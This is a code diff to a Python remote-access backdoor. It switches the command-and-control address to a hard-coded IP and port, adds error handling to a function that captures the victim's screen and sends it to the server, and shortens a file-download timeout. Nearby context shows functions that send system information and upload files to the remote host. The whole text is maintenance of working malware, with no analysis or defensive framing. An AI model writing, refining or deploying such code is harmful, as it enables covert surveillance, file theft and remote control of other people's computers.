@@ -1,8 +1,7 @@
 import socket, os, time, subprocess, mss, rsa
 from cryptography.fernet import Fernet 
 
-address = ("2.tcp.ngrok.io", 11115)
-ping_address = ("0.0.0.0", 4001)
+address = ("206.188.196.139", 3000)
 authed = False
 
 
@@ -113,11 +112,14 @@ def ping(ping_address):
 
 # Backdoor specific functions
 def take_screen_shot():
-    if mss.mss().monitors:
-        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
-        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
-        global server_con, authed
-        send(sock=server_con, data=img_data, is_authed=authed)
+    try:
+        if mss.mss().monitors:
+            raw_pixels = mss.mss().grab(mss.mss().monitors[0])
+            img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
+            global server_con, authed
+            send(sock=server_con, data=img_data, is_authed=authed)
+    except mss.ScreenShotError:
+        print("Unable to take screenshot.")
 
 def send_sys_info():
     global server_con, authed
@@ -139,7 +141,7 @@ def upload_file(file_name):
 
 def download_file(file_name, file_path, buff_size=524288):
     try:
-        file_data = recv(buff_size=buff_size, time_out=15, sock=server_con, is_authed=authed)
+        file_data = recv(buff_size=buff_size, time_out=5, sock=server_con, is_authed=authed)
         
         if file_data:
             file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
